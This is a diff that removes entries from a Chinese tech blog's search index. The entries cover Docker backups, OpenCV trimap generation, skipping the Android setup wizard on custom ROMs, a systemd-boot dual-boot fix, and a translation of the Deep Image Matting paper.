@@ -1,159 +1,1182 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
-  <entry>
-    <title><![CDATA[Docker试玩笔记]]></title>
-    <url>%2F2019%2F06%2F28%2FDocker%E8%AF%95%E7%8E%A9%E7%AC%94%E8%AE%B0%2F</url>
-    <content type="text"><![CDATA[未完工。 推荐网站：Play with Docker，网站提供了免费 Linux 环境来供大家在浏览器中构建并运行 Docker。 Docker 中容器/镜像的备份、恢复及迁移 备份容器 1docker ps 列出在运行的需要备份的容器，得到 CONTAINER ID 。 1docker commit -p "CONTAINER ID" "backup name" 导出镜像 1docker save -o ./docker_backup.tar "backup name" 恢复 1docker load -i ./docker_backup.tar]]></content>
-      <categories>
-        <category>Docker</category>
-      </categories>
-      <tags>
-        <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[半自动生成 Trimap]]></title>
-    <url>%2F2019%2F05%2F08%2F%E5%8D%8A%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90Trimap%2F</url>
-    <content type="text"><![CDATA[一个简单的 Trimap 生成方法。基于轮廓查找、填充以及形态学操作。 基本思路 生成与图像宽高对应的 “mask” 1np.zeros((h, w), dtype=np.uint8) 绘制所需轮廓（封闭） 12345def draw_circle(event, x, y, flags, param): if flags == cv.EVENT_FLAG_LBUTTON: cv.circle(img, (x, y), 10, (255, 0, 0, 0), -1) cv.circle(img_mask, (x, y), 10, (255, 255, 255), -1)cv.setMouseCallback('image', draw_circle) 轮廓查找及填充 12contours, hierarchy = cv.findContours(binImg, cv.RETR_TREE, cv.CHAIN_APPROX_SIMPLE)cv.drawContours(image, contours, 0, (255, 255, 255), cv.FILLED) 生成 Trimap (dilate) 1unknown = cv.dilate(unknown, kernel, iterations=np.random.randint(1, 100) 效果原图： 结果： 缺点 限单一轮廓 不精确 代码：trimap generate]]></content>
-      <categories>
-        <category>Python</category>
-        <category>CV</category>
-      </categories>
-      <tags>
-        <tag>OpenCV</tag>
-        <tag>TrimapGenerate</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[类原生跳过 Google 向导的各种办法]]></title>
-    <url>%2F2019%2F04%2F22%2F%E7%B1%BB%E5%8E%9F%E7%94%9F%E8%B7%B3%E8%BF%87Google%E5%90%91%E5%AF%BC%E7%9A%84%E5%90%84%E7%A7%8D%E5%8A%9E%E6%B3%95%2F</url>
-    <content type="text"><![CDATA[相信很多人跟俺一样喜欢使用类原生的 Android 系统，而缺少了 Google 服务框架的 Android 就如同人没有了灵魂。但是有时候 Google 的开机向导却让人很烦，下面就总结一下各种跳过开机向导的办法。 0、先说一下出现的原因如果你先阅读了本章节，可能免去阅读以下章节造成的时间浪费。 下面几种操作会让你必须在第一次进入系统时完成设置向导： 刷机之前没有退出登录 Google 账号 没有拔掉中国的手机卡 买了 Google Pixel （咱没用过，应该必须要走设置向导这个流程吧） 人品差 如果你能避免以上操作，开机向导应该能非常舒适的跳过。 总之，如果你因为上面的原因或其他不可预知的问题造成你未能舒适的进入系统，下面的内容可能就有你需要的。 1、方法有很多种以下内容尽量采取由简到繁的顺序。但是部分方法因为没有设备或者条件不足或者懒的原因，本文并不提供具体方法。 良好的网络环境 身处国外 路由器插件科学上网 电脑科学上网并共享给手机 非中国大陆地区电话卡 “良好”的 ROM + Gapps 设置向导界面点击四角跳过 其他emmm 个人喜欢的方法 数据线连接电脑，进入 TWRP 并 mount（挂载）system 分区 adb devices 确保一切无误 adb pull system/build.prop /dir 将所需文件拉取到电脑 echo &#39;ro.setupwizard.mode=DISABLED&#39; &gt;&gt; /dir/build.prop 或手动编辑 build.prop 加入一行 ro.setupwizard.mode=DISABLED adb push /dir/build.prop system 将文件放回去 adb shell 进入手机内部 shell cd system chmod 0644 build.prop exit 重启 或者 TWRP 内直接使用 vi 编辑器添加 ro.setupwizard.mode=DISABLED ，前提是知道 vi 的基本操作。 不推荐的方法 直接 TWRP 删除 setupwizard 相关软件 大致如此，有更好的方法欢迎评论。当然，Google 如果能够回来才是最吼的。]]></content>
-      <categories>
-        <category>Tips</category>
-      </categories>
-      <tags>
-        <tag>Google</tag>
-        <tag>开机向导</tag>
-        <tag>setupwizard</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Pop!_OS 与 Windows10 不同盘双系统启动问题]]></title>
-    <url>%2F2019%2F04%2F05%2FPop!_OS%20%E4%B8%8E%20Windows10%20%E4%B8%8D%E5%90%8C%E7%9B%98%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98%2F</url>
-    <content type="text"><![CDATA[前言：Pop!_OS 在新的版本不再使用 GRUB 而是选择了能让启动速度更快（在某些论坛看到一些说法，不知是否准确）的 systemd-boot&gt;) 。但是 systemd-boot&gt;) 无法识别到另一个磁盘 EFI 分区的 Windows 。因为不了解 systemd-boot&gt;) 所以就在网上搜索了一些信息，这里做个总结。 一假设你是根据此教程已完成双系统的安装，且 EFI 与 Windows 不在同一块硬盘。那么 Pop!_OS 的 EFI 会在 /boot/efi/ 路径下，其中 EFI 下存有相应的文件，loader 下是对应的启动配置文件。 找到 Windows 的 EFI 分区，挂载 1sudo fdisk -l 1sudo mount /dev/nvme0n1p2 /dir # 每个人的分区可能有所不同 然后将分区内文件复制到 /boot/efi/EFI/ 内。 二先查看 Windows EFI 分区的 PARTUUID 1blkid -s PARTUUID -0 value /dev/nvme0n1p2 然后在 /boot/efi/loader/entries/ 下创建一个 Windows 的配置文件 Windows_10.conf，填入以下内容（其中 PARTUUID 替换为上一步中得到的信息） 123title Microsoft Windows 10efi /EFI/Microsoft/Boot/bootmgfw.efioptions root=PARTUUID=6ded70ea-82c3-4b0c-9edc-b5a71a55a0e8 rw 三1bootctl update 因为 systemd-boot&gt;) 会默认直接进入 Pop!_OS 所以你可以选择在开机时按住空格键或者修改 /boot/efi/loader/loader.conf 文件，添加一行： 1timeout 30 接下来重启就可以选择启动那个系统了。 疑惑经过上述步骤后，启动时会出现 Microsoft Windows 10 和 Windows Boot Manager 两个 Windows 选项，前者是我们创建的，后者应该是自动识别的。 所以很疑惑是否一和二只需其一？我没有去测试，如果有人尝试了可以评论/Email告诉我结果。 参考文章： 想问下systemd-boot引导双系统的问题]]></content>
-      <categories>
-        <category>EFI</category>
-        <category>双系统</category>
-      </categories>
-      <tags>
-        <tag>双系统</tag>
-        <tag>EFI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[深度抠图 Deep Image Matting 译文]]></title>
-    <url>%2F2019%2F03%2F13%2F%E6%B7%B1%E5%BA%A6%E6%8A%A0%E5%9B%BE_DeepImageMatting%2F</url>
-    <content type="text"><![CDATA[本文是 Adobe 等机构的论文 Deep Image Matting 译文。因为是初稿，如有错误及不当之处，烦请指正。 深度抠图Ning Xu1,2, Brain Price3, Scott Cohen3, and Thomas Huang1,2 1Beckman Institute for Advanced Science and Technology 2University of Illinois at Urbana-Champaign 3Adobe Research {ningxu2, t-huang1}@illinois.edu, {bprice, scohen}@adobe.com 摘要抠图是一个基本的计算机视觉问题，并且拥有广阔的应用空间。但当图像的前景和背景颜色或复杂纹理类似时，以前的算法表现的差强人意。主要是因为：1. 只有低层次特征（low-level features）；2. 缺乏高层次上下文图镜（high-level context）。本文中，我们提出了一种基于深度学习的新算法，该算法可以解决这两个问题。我们的深度模型分为两个阶段：第一个阶段是深度卷积编码-解码网络（deep convolutional encoder-decoder network），该神经网络将图像和对应的三分图（trimap）作为输入，并预测图像的 α 蒙版（α matte）；第二阶段是一个小型卷积神经网络，该神经网络对第一个网络预测的 α 蒙版进行精炼从而拥有更准确的 α 值和锐化边缘。另外，我们还创建了一个大规模抠图数据集（large-scale image matting dataset），该数据集包含 49300 张训练图像和 1000 张测试图像。我们在抠图基准、测试数据集和各种真实图像上评估了我们的算法。实验结果清楚的表明了我们的算法比先前的方法更具优越性。 1. 简介抠图是图像或视频中准确的前景估计问题，具有重要的现实意义。它是图像编辑和电影制作的关键技术，高效的自然图像抠图方法能极大地提升当前的图像视频处理流程的效率。并且这种技术是无约束场景（unconstrained scenes）下处理真实世界图像的必要方法。 不幸的是，目前的抠图方法无法很好的推广到典型的日常场景。这在一定程度上是由于问题的难度：抠图问题是欠约束的，在每个像素上有 7 个未知值却仅有 3 个已知值： I_i = α_iF_i + (1 - α_i)B_i \quad α_i∈[0, 1] \tag {1}其中已知的 I_i 是像素 i 的 RGB 色彩，前景色 F_i ，背景色 B_i 和蒙版估计（matte estimation）α_i 均为未知量。因此，目前的方法在其方法中进一步受到限制。 第一个限制是目前用来求解抠图方程（matting equation）的方法存在问题。 这个方程将抠图问题表述为两种颜色的线性组合，因此目前大多数算法都将其作为颜色问题来处理。标准方法包括采样前景色和背景色 39 ，根据抠图方程 143122 或者两者的混合 32132816 传播 α 值。这种方法很大程度上依赖于颜色作为区别特征（通常与像素的空间位置一起），使得它们对前景和背景颜色分布重叠的情况非常敏感，对于这个方法不幸的是，自然图像的常见情况，根据方法的不同，往往导致低频“smearing”或高 频“chunky”伪影（参见图 1 的顶行）。即使是最近提出的深度学习方法也高度依赖于颜色相关的传播方法829。 图 1. 我们的方法和 Close-form Matting22之间的比较第一张图来自 Alpha Matting 基准，第二张图片来自我们的 1000 张测试图像 第二个限制是由于非常小的数据集。一般用于抠图的标准结果（ground truth）是很复杂的，而 alphamatting.com 数据集 25 通过提供标记数据集（ground-truth）对抠图研究做出了很重要的贡献。不过因为该数据集只由 27 张训练图像和 8 张测试图像组成，其中大部分是监视器上图像前面的物体。由于其大小和数据集的约束（例如：室内实验室场景，室内照明，没有人类或动物），它本质上会存在偏差，并且为了发布的目的激励方法适应这些数据。与所有数据集（尤其是小数据集）的情况一样，某些时候，方法将过拟合数据集，不再能推广到真实场景。最近拥有 3 个训练视频和 10 个测试视频的视频抠图数据集10 ，其中 5 个是从绿屏画面中提取的，其余的是使用类似alphamatting数据集25的方法。 在这项工作中，我们提供了一种旨在克服这些局限性的方法。我们的方法是使用深度学习在给定输入图像和三分图的基础上直接预测 α 蒙版（alpha matte）。我们的神经网络并不首要依赖于色彩信息，它会学习图像的自然结构，并将其反映到 α 蒙版中。例如头发和毛皮（通常需要将其抠出来）就拥有很强的结构和纹理图案。以及其他通常需要抠图的并且存在能抽取出的公用结构体或 α 蒙版轮廓的情况（例如：物体的边缘、光学或运动模糊的区域、或者半透明区域）。并且由于低层次的特征并不会捕获这些结构，那么就需要深度神经网络去表征它们了。我们的两阶段神经网络包含了编码器-解码器阶段和使用小型残差网络进行精炼阶段，并且包含除了 α 损失之外的新的合成损失（ompositional loss）。我们是第一个证明了在给定输入图像和三分图的情况下能采用端到端的方式学习到 α 蒙版。 为了训练一个在无约束场景的自然图像中表现优异的模型，我们需要一个比现有更大的数据集。使用alphamatting 25 的方法获得标准结果（ground truth）数据集是非常复杂的，并且无法处理任何程度的运动场景（因此无法捕获人类或动物）。相反，受其他合成数据集已被证明足以训练模型用于真实图像的启发（例如：4），我们使用合成方法构建了一个大规模的抠图数据集。仔细提取具有简单背景图片上的对象并将其合成为具有新的背景的图像以创建具有 49300 个训练图像和 1000 个测试图像的数据集。 我们进行了广泛的评估，以证明我们的方法的有效性。我们的方法不仅在 alphamatting.com 挑战中获得第一名，而且我们在合成测试集上的表现也大大超过了先前的方法。我们与用户展示并研究了我们的学习模型推广（generalizes）到自然图像的情况并与先前的许多方法在 31 种不同场景、不同照明并以人类、动物和其他物体为特色的自然图像中的表现做了对比。研究显示更偏向于我们的结果，但同时也表明，与人类判断的的其他方法相比，某些在 alphamatting.com 数据集上表现良好的方法实际上表现的较差，这表明这些方法在 alphamatting.com 数据集上是过拟合的。最后，模型还展示出对 trimap 的放置比其他方法更稳健。实际上，即使 trimap 没有已知的前景和/或背景，我们也可以得到很好的结果，而大多数方法都不能返回任何结果（参见图 1第2行）。 2. 相关工作目前的抠图方法主要依靠颜色以及位置或其他低层次特征来确定 α 蒙版（alpha matte）。它们通过采样、传播或两者的组合来实现。 基于采样的方法 3932132816 中，对已知的前景和背景区域采样来找到对于给定像素的前景和背景候选颜色，然后使用度量（metric）来确定最佳前景/背景组合。使用不同的采样方法，包括距离给定像素最近的边界进行采样 32 ，基于射线铸造（ray casting）的采样 13 ，搜索整个边界 16 ，或从颜色簇（color clusters）采样 2812 。在采样候选项中确定度量（metric）几乎总是包含一个抠图方程式重构误差（matting equation reconstruction error），可能由于测量样本与给定像素的距离 3216 或者前景和背景样本的相似性 3228 ，以及包括稀疏编码 12 和 KL-divergence （KL-发散）方法 1918 。像纹理 27 等高阶特征已经很少使用，并且效果有限。 在传播方法中，公式 (1) 重新配置，使其允许 α 值从已知的前景和背景区域传播（propagation）到未知区域。流行的方法是使用通常作为采样后的后处理 321628 的 Close-form 抠图 22 。它从前景和背景颜色的局部平滑度假设推导出一个成本函数，并通过求解稀疏线性系统方程组找到全局最优的 α 蒙版（alpha matte）。其他的传播方法包括随机游走（random walks）14 ，求解泊松方程（Poisson equation）31 和非本地传播方法（nolocal propagation methods）2175 。 近年来，人们提出了一些深度学习方法来解决抠图问题。然而，不能直接从给定图像和三分图中学习其 α 蒙版（alpha matte）。Shen 等人 29 使用深度学习创建肖像图中人物的三分图，并使用 22 进行抠图，将抠图误差（error）反向传播到网络中。Cho 等人8 采用 22 和 5 的抠图结果，将 RGB 颜色归一化为输入，并训练一个端到端的深度网络来预测新的 α 蒙版（alpha matte）。虽然我们的算法和这两个项目都利用了深度学习，但我们的算法与它们的算法完全不同。我们的算法直接学习给定从给定图像和三分图直接学习对应的 α 蒙版（alpha matte）而另外两个项目依赖于现存的算法来计算实际的抠图问题，使得他们的方法容易出现和以前的抠图方法同样的问题。 图 2. 数据集的创建。 (a) 包含简单背景的手动抠图的输入图像， (b) 计算 alpha 蒙版和 (c) 计算的前景色用作数据真值用来将对象合成到 (d-f) 各种背景图上。 3. 新的抠图数据集alphamatting.com 25 上的抠图基准在推动抠图研究的进步方面取得了巨大的成功。然而，由于获取数据真值（ground truth）图像需要细心且繁琐的工作，此数据集仅由 27 张训练图像和 8 张测试图像构成。这不仅不足以训练神经网络，而且其多样性受到严重限制，仅限于具有静态物体的小规模实验室场景。 为了训练我们的抠图网络，我们通过将真实图像中的对象合成到新的背景来创建更大的数据集。我们在简单的背景上找到图像（图 2.a），包括来自 25 的 27 个训练图像和来自 26 的视频的每五个帧。使用 PhotoShop 我们手动创建了 α 蒙版（alpha matte）（图 2. b）和纯前景图像（图 2. c）。因为这些对象具有简单的背景，所以我们可以为他们提供准确的蒙版。然后我们将这些作为基本的标准结果（ground truth），对于每个 α 蒙版和前景图像，我们在 MS COCO 23 和 Pascal VOC 11 中随机抽取 N 个背景图像，并将对象合成到这些背景图像上。 我们使用上述方法创建了训练数据集和测试数据集。我们的训练数据集拥有 493 个独特的前景对象和 49300 个图像（N = 100），而我们的测试数据集有 50 个独立对象和 1000 个图像（N = 20）。每个图像的三分图从其真实的 α 蒙版中随机膨胀（dilate）而成。与之前的抠图数据集相比，我们的新数据集有以下几个优点：1) 它拥有更多的独特的对象，并涵盖各种抠图的情况，如毛发、毛皮、半透明度等。2) 许多合成图像具有相似的前景色和背景色以及复杂的背景纹理，使我们的数据集更具有挑战性和使用性。 一个早期的问题是，由于图像的合成性质，这个过程是否会产生偏差，因此网络应学会关注前景和背景亮度、噪声水平等的差异。然而，我们通过实验发现，与现有方法相比，我们在自然图像上获得了更好的结果（见 5.3 节）。 4. 我们的方法我们使用深度学习来解决抠图问题。鉴于我们的新数据集，我们训练一个神经网络以充分利用数据。该网络有两个阶段组成（图 3）。第一阶段是深度卷积编码-解码器网络，它采用图像小块（image patch）和三分图作为输入，并且因为 α 预测损失和新的（组合损失compositional loss）而有不利之处。第二阶段是一个小的全卷积网络，它以更准确的 alpha 值和更清晰的边缘完善了第一个网络的 alpha 预测。我们将在以下各节中详细描述我们的算法。 图 3. 我们的网络包含两个阶段，一个是编码器-解码器阶段（4.1节），一个是精炼阶段（4.2节） 4.1. 抠图编码器-解码器阶段（Matting encoder-decoder stage）我们的第一阶段是一个深度编码-解码器网络（参见图 3.），它在许多其他计算机视觉任务中取得了成功，例如图像分割 2，边缘预测33和孔填充（hole filling）24。 网络结构（Network structure）： 网络的输入时一个图像小块和相应的三分图，它们沿着通道维度连接，产生 4 通道输入。整个网络由编码器网络和解码器网络组成。通过后续卷积层和最大池化层将编码器网络的输入转化为下采样特征图（feature map）。解码器网络一次使用后续的反池化层来反转最大池化操作和卷积层来对特征映射进行上采样，并具有所需的输出，在我们的例子中是 alpha 蒙版。具体来说，我们的编码器网络有 14 个卷积层和 5 个最大池化层。对于解码器网络，我们使用比编码器网络更小的结构来减少参数数量并加快训练过程。具体来说，我们的解码器网络有 6 个卷积层，5 个反卷积层，后面是最终的 alpha 预测层。 损失（Losses）： 我们的网络利用了两次损失。第一个损失称为 alpha 预测损失（alpha-prediction loss），即数据真值 alpha 值与每个像素的预测 alpha 值之间的绝对差值。但是，由于绝对值的不可微分性，我们使用以下损失函数来近似它。 \mathcal{L}_α^i = \sqrt{(α_p^i-α_g^i)^2 + \epsilon^2} ，\ \ \ \ α_p^i,α_g^i \in [0,1] \tag{2}其中 α_p^i 是预测层在阈值化为 0 到 1 之间的像素 i 处的输出。\alpha_g^i 是像素 i 数据真值的 alpha 值。\epsilon 是一个很小的值，在我们的实验中等于 10^{-6} 。导数 \frac{\partial \mathcal{L}\_\alpha^i}{\partial \alpha\_p^i} 如下。 \frac{\partial \mathcal{L}_\alpha^i}{\partial \alpha_p^i} = \frac{α_p^i-α_g^i}{\sqrt{(α_p^i-α_g^i)^2 + \epsilon^2}} \tag{3}第二个损失被称为合成损失（compositional loss），它是数据真值的 RGB 颜色和由数据真值前景、背景和合成的 alpha 蒙版预测的 RGB 颜色之间的绝对差值。同样，我们可以使用以下损失函数来近似它。 \mathcal{L}_c^i = \sqrt{(c_p^i - c_g^i)^2 + \epsilon^2} \tag{4}其中 c 表示 RGB 通道，p 表示由预测的 alpha 合成的图像，g 表示由数据真值 alpha 构成的图像。组合损失（compositional loss）限制网络遵循组合操作（compositional operation），使得 alpha 预测更加准确。 总损失是两个损失的加权求和，即 \mathcal{L}_overall = {w_l} \cdot {\mathcal{L}_\alpha} + (1 - w_l) \cdot {\mathcal{L}_c} ，其中 w_l 在我们的实验中设置为 0.5 。此外，因为只需要推断三分图未知区域的 alpha 值，所以我们根据像素位置对两种类型的损失设置额外的权重，这可以帮助我们的网络更注重于重要区域。具体地，如果像素 i 在三分图的未知区域内，则 w_i = 1 ，否则 w_i = 0 。 实现（Implementation）： 虽然我们的训练数据集有 49300 个图像，但只有 493 个唯一对象。为了避免过拟合以及更有效的利用训练数据，我们使用了一些训练策略。首先，我们以未知区域中的像素为中心随机裁剪为 320\times320 \ (image, trimap) 。这增加了我们的采样空间。其次，我们还裁剪了不同尺寸的训练对（例如：480\times480 , 640\times640）并将其调整为 320\times320 。这使得我们的方法在扩展方面更加健壮，并有助于网络更好的学习上下文和语义。第三，在每个训练对上随机进行翻转（flipping）。第四，三分图从它们的数据真值 alpha 蒙版（ground truth alpha mattes）中随机扩张，帮助我们的模型对三分图的放置（placement）更稳健。最后，在每个训练周期结束后随机重建训练输入。 网络的编码器部分是用 VGG-16 30 的前 14 个卷积层初始化的（第 14 层是全连接层 “fc6” ，可以转换为卷积层）由于网络具有 4 通道输入，我们用全零初始化第一层卷积滤波器的一个额外通道。所有解码器参数都用 Xavier 随机初始化。 测试时，图像和相应的三分图作为输入串联。执行网络的前向传播以输出 alpha 蒙版预测。当 GPU 内存不足以容纳大图像时，可以执行 CPU 测试。 4.2. 抠图细化阶段（Matting refinement stage）：尽管来自我们网络第一部分的 alpha 预测已经比现有的抠图算法好得多，但由于编码器-解码器结构，结果有时过于平滑。因此，我们扩展我们的网络以进一步完善第一部分的结果。这种扩展的网络通常可以预测更准确的 alpha 蒙版和更清晰的边缘。 网络结构（Network structure）： 我们网络的第二阶段的输入是图像小块（image patch）与第一阶段的 alpha 预测（在 0 到 255 之间缩放）的串联，从而产生四通道输入。输出是相应的相应的数据真值（ground truth）的 alpha 蒙版。该网络是一个完全卷积网络，包括 4 个卷积层。前三个卷积层中的每个后面是非线性 ReLU 层。没有下采样层，因为我们希望保留第一阶段中非常细微的结构。此外，我们使用了 ”skip-model“ 结构，其中输入数据的第 4 个通道首先在 0 到 1 之间缩放（scaled），然后在网络的输出上添加。详细配置如图 3 所示。 我们的细化阶段的效果如图 4 所示。注意，它不会对 alpha 蒙版进行大规模更改，而只是细化和锐化 alpha 值。 图 4. 我们抠图细化网络的影响。(a) 输入图像。(b) 编码器-解码器阶段结果。(c) 抠图细化层结果。 实现（Implementation）： 在训练期间，我们首先更新编码器-解码器部分而不使用细化部分。在编码器-解码器部分收敛之后，我们修复其参数，然后更新细化部分。由于其结构简单，仅使用 alpha 预测损失（公式 2）。除第 4 阶段外，我们还使用了第 1 阶段的所有训练策略。在细化部分也收敛之后，最后我们一起微调整个网络。我们使用 Adam 20 来更新这两个部分。较小的学习率 10^{-5}​ 在训练过程中不断被设置。 测试时，输入图像和对应的三分图，我们的算法首先使用抠图网络的编码器-解码器阶段来获得初始的 alpha 蒙版预测。然后将图像和 alpha 蒙版预测连接作为细化阶段的输入以产生最终的 alpha 蒙版预测。 5. 实验结果在本节，我们将在 3 个数据集上评估我们的方法。1）在抠图方法的现有基准 alphamatting.com 数据集 25 上评估。它包括 8 个测试图像，每个图像有 3 个不同的三分图，即 “small” 、”large” 和 “user” 。2）由于 alphamatting.com 数据集中对象的大小和范围有限，我们建议使用 Composition-1k 测试集。我们基于 Composition 的数据集包含 1000 张图像和 50 个独特的前景。此数据集具有更广泛的对象类型和背景场景。3）为了测试我们的方法在自然图像上的表现，我们还收集了包括 31 个自然图像的第三个数据集。自然图像涵盖了广泛的常见抠图前景，比如人、动物等。 Methods SAD MSE Gradient Connectivity Shared Matting 13 128.9 0.091 126.5 135.3 Learning Based Matting 34 113.9 0.048 91.6 122.2 Comprehensive Sampling 28 143.8 0.071 102.2 142.7 Global Matting 16 133.6 0.068 97.6 133.3 Closed-Form Matting 22 168.1 0.091 126.9 167.9 KNN Matting 5 175.4 0.103 124.1 176.4 DCNN Matting 8 161.4 0.087 115.1 161.9 —————— ——- ——- ———— —————— Encoder-Decoder network (single alpha prediction loss) 59.6 0.019 40.5 59.3 Encoder-Decoder network 54.6 0.017 36.7 55.3 Encoder-Decoder network + Guided filter17 52.2 0.016 30.0 52.6 Encoder-Decoder network + Refinement network 50.4 0.014 31.0 50.8 表 1. Composition-1k 测试数据集的定量结果。我么的方法的变体以斜体强调。最佳的结果以粗体强调。 5.1. alphamatting.com 数据集与 alphamatting.com 基准测试中的所有其他方法相比，我们的方法取得了最佳结果。具体来说，我们的方法在 SAD 指标方面排名第一。对于具有 3 个三分图的 5 个图像（图 5.），我们的方法也具有最小的 SAD 误差。此外，我们的方法在 MSE 和 Gradient 指标方面排名第二。总的来说，我们的方法是该数据集中表现最佳的方法之一。 我们成功的一个关键原因是我们的网络学习结构和语义的能力，这对于在背景场景复杂或背景和前景色相似时准确估计 alpha 蒙版非常重要。例如，在图 6 中，”Troll” 实例具有非常相似的头发和桥的颜色，而 “Doll” 实例具有强烈的纹理背景。以前方法的最佳结果（从第 3 列到第 6 列）在这些硬区域都有明显的错误。相比之下，我们的方法直接学习对象结构和图像上下文。因此，我们的方法不仅避免了以前方法所犯的类似错误，而且还预测了更过细节。值得注意的时，虽然 DCNN matting 8 也是一种基于深度学习的方法，它学习了小型局部先前具有小型局部补丁的抠图方法的分线性组合（it learns the non-linear combination of previous matting methods within small local patches）。因此，该方法不能真正理解语义，因此具有与先前的非基于深度学习的方法相同的限制。 图 5. alphamatting.com 数据集上的 SAD 结果。展示了前五个方法。我们的方法用红框强调。 图 6. 测试图像的alpha蒙版预测，其中”Troll“三分图为”user“，”Doll“三分图为”small“。第一列显示测试图像。对于每个测试图像，从第２列到第６列显示了在SAD度量下的第一名到第五名。在两个例子中，我们的方法都时最佳结果。 Local-Sampling6 TSPS-RV1 CSC12 DCNN8 LNSP7 KL-Divergence19 Iterative15 5.2. Composition-1k 测试数据集我们在 Composition-1k 测试数据集上进一步评估了 7 种先前表现最佳的方法和我们方法的每个组成部分。对于先前的方法，使用作者提供的代码。我们方法的不同变体包括：抠图编码器-解码器网络 1）只有 alpha 预测损失，2）包含 alpha 预测损失和组合损失（compositional loss），抠图编码器-解码器网络 3）由 Guided filter17 后处理（post-processed）和 4）抠图细化网络（matting refinement network）后处理。 [25] 中提出的 SAD，MSE，Gradient 和 Connectivity 误差下的定量结果显示在表 1 中。显然我们方法的所有变体都比其他方法有更好的结果。主要原因仍然是我们的深度模型能够理解图像的复杂背景，而其他方法则无法理解。通过比较我们方法的变体，我们还可以验证我们方法的每个组成部分的有效性：1）组合损失（compositional loss）有助于我们的模型学习组合操作（compositional operation），从而产生更好的结果，2）通过与先前的 edge-preserving filter（例如：Guided filter17）以及我们的抠图细化网络相结合，可以改善我们的抠图编码器-解码器网络的结果。但是，后者在视觉上和数量上都有更明显的改进，因为它直接用我们的编码器-解码器网络的输出进行训练。 我们在图 7 中测试了我们的方法对三分图放置（placement）的灵敏度。我们对数据集的一个子集进行评估，其中包括每个唯一对象的一个随机选择的图像，总共 50 个图像。为了形成三分图，我们将每个图像的数据真值（ground truth）alpha扩展 d 个像素以增加 d 的值。特定参数 d 处的 SAD 误差是在所有图像上的平均。参数 d\in[1,4,7,10,13,16,19] 的所有方法的结果如图 7 所示。显然，我们的方法具有低且稳定的错误率，随着 d 值的增加，而其他方法的错误率迅速增加。我们的良好表现源于我们的训练策略以及对图像语义的良好理解。 图 7. 不同水平三分图扩张的 SAD 误差。 图 8 显示了一些可见的例子，表明我们的方法在不同的抠图情况下的良好表现，如头发、洞和半透明。此外，我们的方法还可以处理没有纯前景像素的对象，如图 8 中的最后一个实例所示。由于先前基于采样和基于传播的方法必须利用已知的前景和背景像素，因此它们无法处理这种情况，而我们的方法可以直接从数据中学习精细细节的外观。 图 8. Compositional-1k 测试数据集的视觉比较结果。“Ours-raw”表明了我们的抠图编码器-解码器阶段的结果，而“Ours-refined”表明了我们的精细化阶段的结果。 5.3. 真实图像数据集抠图方法应该能够很好的扩展到真实世界的图像。为了验证我们的方法和其他方法在真实图像上的性能我们对真实图像数据集进行了用户研究。这些图像包括从互联网上提取的图像以及 ICCV 2013 教程中关于抠图的图像。 因为我们的受试者可能不熟悉 alpha 蒙版，所以我们改为评估组合物的结果。对于每种方法，计算的 alpha 蒙版用于混合测试图像到黑色背景上和白色背景上。对于用户测试，我们向用户呈现图像和两个随机选择的方法的两个合成结果，并询问那些结果更准确和更真实，尤其是在精细细节的区域（例如头发、对象的边缘和半透明区域）。为了避免评估误差，我们在 Amazon Mechanical Turk 上进行用户研究。结果，共有 392 个用户参与用户研究，并且一个图像上的每个方法对由 5 到 6 个唯一用户评估。 成对比较结果显示在表 2 中，其中，每列显示一种优于其他方法的方法。例如，用户 83.7% 的时间更喜欢我们的结果对于 13 。值得注意的是，近五分之四的用户更喜欢我们的方法超过现有的方法，这很好地证明了我们的方法确实产生了更好的视觉效果。有关视觉效果，参见图 9 。 图 9. 我们的真实图像数据集的示例结果。 Methods [13] [34] [28] [16] [22] [5] [8] Ours Shared 13 - 60.0 78.5 79.6 69.7 40.6 57.8 83.7 Learning 34 40.0 - 60.2 54.6 53.4 27.3 35.1 83.6 Comprehensive 28 21.5 39.8 - 25.8 43.3 20.4 29.2 78.8 Global 16 20.4 45.4 74.2 - 53.3 30.0 42.0 84.2 Closed-Form22 30.3 46.6 56.7 46.7 - 25.0 38.1 80.4 KNN5 59.4 72.7 79.6 70.0 75.0 - 73.3 97.0 DCNN 8 42.2 64.9 70.8 58.0 61.9 26.7 - 83.7 Ours 16.3 16.4 21.2 15.8 19.6 3.0 16.3 - 同样值得注意的是，与其他两种实验相比，本实验中的其他方法的排名不同。例如，Closed-Form Matting 22 是我们在 alphamatting.com 数据集上比较的方法中排名最低的，但对用户来说，它比除我们和 28 的其他所有方法更可取。另一方面，尽管 DCNN 8 是先前在 alphamatting.com 上最先进的方法，但在真实图像上仅优于两种方法。目前还不清楚这究竟是由于方法过度拟合了 alphamatting.com 数据集，还是标准错误指标未能准确衡量人类对 alpha 蒙版结果的感知判断。 6. 结论为了推广到自然图像，抠图算法必须避免使用颜色作为抠图的主要依据，并利用更多的结构和语义特征。在这项工作中，我们展示了神经网络能够捕获这样的高阶特征并应用它们来计算更好的抠图结果。我们的实验表明，我们的方法不仅优于标准数据集上的先前的方法，而且能够更好的推广到真实图像。 参考文献 1. A. Al-Kabbany and E. Dubois. Matting with sequential pair selection using graph transduction. In 21st International Symposium on Vision, Modeling, and Visualization, 2016. 6 &#8617; 2. V. Badrinarayanan, A. Handa, and R. Cipolla. Segnet: A deep convolutional encoder-decoder architecture for robust semantic pixel-wise labelling. arXiv preprint arXiv:1505.07293, 2015. 3 &#8617; 3. A. Berman, A. Dadourian, and P. Vlahos. Method for removing from an image the background surrounding a selected object, Oct. 17 2000. US Patent 6,134,346. 1, 2 &#8617; 4. D. J. Butler, J. Wulff, G. B. Stanley, and M. J. Black. A naturalistic open source movie for optical flow evaluation. In Proceedings of the European Conference on Computer Vision, 2012. 2 &#8617; 5. Q. Chen, D. Li, and C.-K. Tang. Knn matting. IEEE transactions on pattern analysis and machine intelligence, 35(9):2175–2188, 2013. 2, 5, 7, 8 &#8617; 6. X. Chen and F. He. A propagation matting method based on the local sampling and knn classification with adaptive feature space. Journal of Computer-Aided Design and Computer Graphics, 2016. 6 &#8617; 7. X. Chen, D. Zou, S. Zhiying Zhou, Q. Zhao, and P. Tan. Image matting with local and nonlocal smooth priors. In 